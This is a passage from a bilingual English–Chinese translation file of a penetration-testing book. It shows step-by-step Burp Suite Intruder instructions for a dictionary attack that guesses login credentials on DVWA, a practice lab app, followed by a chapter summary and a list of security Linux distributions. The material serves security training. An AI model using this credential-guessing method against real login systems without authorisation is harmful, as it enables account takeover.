- en: Turn intercept on again and log into DVWA with empty credentials and go to the
    **Proxy** | **Intercept** in Burp. You will see the `username` and `password`
    parameters without values in the `POST` request body.
  id: totrans-494
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 再次打开拦截功能，使用空凭证登录 DVWA，然后转到 Burp 中的 **Proxy** | **Intercept** 标签。你将看到 `POST`
    请求体中的 `username` 和 `password` 参数没有值。
- en: Right-click on the request body and choose **Send to intruder** in the context
    menu. Switch to the **Intruder** tab.
  id: totrans-495
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 右键点击请求体，在上下文菜单中选择**发送到入侵者**。然后切换到**入侵者**标签。
- en: Now, we will perform a dictionary guessing attack on the authentication subsystem
    of DVWA. We will try to guess the correct credentials. Go to the **Positions**
    subtab and click on the **Clear §** button to reset all positions suggested by
    Burp.
  id: totrans-496
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在，我们将在DVWA的认证子系统上执行字典猜测攻击。我们将尝试猜测正确的凭据。进入**位置**子标签并点击**清除 §**按钮以重置Burp建议的所有位置。
- en: Place the cursor after `username=` and type in the `§` character twice or click
    on the **Add §** button twice. Do the same with the password parameter. You should
    have the following:![Example](../images/00067.jpeg)
  id: totrans-497
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 将光标放在`username=`后，输入`§`字符两次，或者点击**添加 §**按钮两次。对密码参数做同样的操作。您应该得到如下内容：![示例](../images/00067.jpeg)
- en: Choose the attack type **Cluster bomb** and go to the next **Payloads** tab.
  id: totrans-498
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 选择攻击类型**集群炸弹**，然后转到下一个**有效载荷**标签。
- en: Add several words to the **Payload Options** section and add the real DVWA username
    too:![Example](../images/00068.jpeg)
  id: totrans-499
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在**有效载荷选项**部分添加几个词，并添加真实的DVWA用户名：![示例](../images/00068.jpeg)
- en: Change the payload set to 2 and add several words for the password payload,
    including the real password:![Example](../images/00069.jpeg)
  id: totrans-500
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 将有效载荷集更改为2，并为密码有效载荷添加几个词，包括真实的密码：![示例](../images/00069.jpeg)
- en: Go to **Options**, scroll down, and select the **In-scope only** radio button
    in the **Redirections** section.
  id: totrans-501
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 进入**选项**，向下滚动，在**重定向**部分选择**仅限范围内**单选按钮。
- en: Now, scroll back up and click on the **Start attack** button in the top-right
    corner and a new window will open. It will show you the progress of the attack
    and all sent and received requests and responses.
  id: totrans-502
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在，向上滚动并点击右上角的**开始攻击**按钮，一个新窗口将会打开。它会显示攻击进度以及所有已发送和接收的请求与响应。
- en: Sort the list by response length by clicking on the corresponding column and
    you will see which payloads have succeeded (successful logon and failure responses
    will be of different lengths in the current example):![Example](../images/00070.jpeg)
  id: totrans-503
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 通过点击相应的列对列表按响应长度进行排序，您将看到哪些有效载荷已成功（在当前示例中，成功登录和失败响应的长度不同）：![示例](../images/00070.jpeg)
- en: The authentication credentials are guessed! Of course, in real projects you
    will not have a guarantee that correct credentials are in your payload list, so
    the success of an attack will depend on your dictionaries.
  id: totrans-504
  prefs: []
  type: TYPE_NORMAL
  zh: 认证凭据被猜测出来了！当然，在实际项目中，您无法保证正确的凭据在有效载荷列表中，因此攻击的成功与否将取决于您的字典。
- en: It was just a quick and short lab example, but there are numerous ways of intercepting
    proxy utilization and they are different for different targets. Take your time
    and properly learn manuals for the tools that you choose for work.
  id: totrans-505
  prefs: []
  type: TYPE_NORMAL
  zh: 这只是一个快速且简短的实验示例，但截取代理的使用方法有很多，并且针对不同的目标有所不同。请花时间认真学习您选择的工具的手册。
- en: Summary
  id: totrans-506
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 总结
- en: In this chapter, you saw an overview of several popular security assessment
    toolkits used in numerous hacking tasks and projects along with examples of their
    utilization in the lab environment. You now have a brief understanding of their
    capabilities and a foundation for further learning.
  id: totrans-507
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，您概览了几个流行的安全评估工具包，这些工具包广泛应用于各种黑客任务和项目，并且展示了它们在实验环境中的使用示例。您现在对它们的功能有了初步了解，为进一步学习奠定了基础。
- en: Apart from that, there are a variety of other frameworks and standalone tools
    for almost every task that a penetration tester can encounter or imagine during
    a project. So, do not hesitate to explore new tools when you have time and try
    them in your lab—that is one of the reasons why you have built it.
  id: totrans-508
  prefs: []
  type: TYPE_NORMAL
  zh: 除此之外，还有许多其他框架和独立工具，几乎涵盖了渗透测试员在项目中可能遇到或设想的所有任务。所以，当您有时间时，不要犹豫，探索新工具并在您的实验室中尝试它们——这也是您构建实验室的原因之一。
- en: 'There are a huge number of tools for wireless security analysis, yet sometimes
    it is hard to find one on the Internet when needed. But there is a repository
    that we recommend you to visit: [https://github.com/0x90](https://github.com/0x90).
    It has a collection of a massive amount of software and scripts in one place.'
  id: totrans-509
  prefs: []
  type: TYPE_NORMAL
  zh: 有大量无线安全分析工具，但有时在需要时很难在互联网上找到适合的工具。不过，我们推荐您访问一个仓库：[https://github.com/0x90](https://github.com/0x90)。它收集了大量软件和脚本，您可以在一个地方找到它们。
- en: 'When you are new to penetration testing and still not sure which tools should
    be in your arsenal, a good place to start is getting a preinstalled penetration
    testing distribution already containing most of the necessary tools. Normally,
    we use Kali Linux as a distribution, but there are a lot of others:'
  id: totrans-510
  prefs: []
  type: TYPE_NORMAL
  zh: 如果你刚接触渗透测试，还不确定应该将哪些工具加入你的工具库，一个好的起点是选择一个预装了大部分必要工具的渗透测试发行版。通常，我们使用 Kali Linux
    作为发行版，但也有很多其他选择：
- en: Parrot Security OS ([http://www.parrotsec.org/](http://www.parrotsec.org/))
  id: totrans-511
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Parrot Security OS ([http://www.parrotsec.org/](http://www.parrotsec.org/))
- en: Pentoo ([http://www.pentoo.ch/](http://www.pentoo.ch/))
  id: totrans-512
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Pentoo ([http://www.pentoo.ch/](http://www.pentoo.ch/))
- en: Matriux ([http://www.matriux.com/](http://www.matriux.com/))
  id: totrans-513
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Matriux ([http://www.matriux.com/](http://www.matriux.com/))
- en: BackBox Linux ([https://www.backbox.org/](https://www.backbox.org/))
  id: totrans-514
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: BackBox Linux ([https://www.backbox.org/](https://www.backbox.org/))
- en: BlackArch Linux ([http://blackarch.org/](http://blackarch.org/))
  id: totrans-515
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: BlackArch Linux ([http://blackarch.org/](http://blackarch.org/))
- en: Samurai Web Testing Framework ([http://samurai.inguardians.com/](http://samurai.inguardians.com/))
  id: totrans-516
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Samurai Web Testing Framework ([http://samurai.inguardians.com/](http://samurai.inguardians.com/))
- en: In the next chapter, we will help you prepare your wireless hacking station
    and show you which tools you have to deploy to be prepared for a wireless penetration
    test.
  id: totrans-517
  prefs: []
  type: TYPE_NORMAL
  zh: 在下一章中，我们将帮助你准备无线黑客工作站，并向你展示在进行无线渗透测试时需要部署哪些工具。
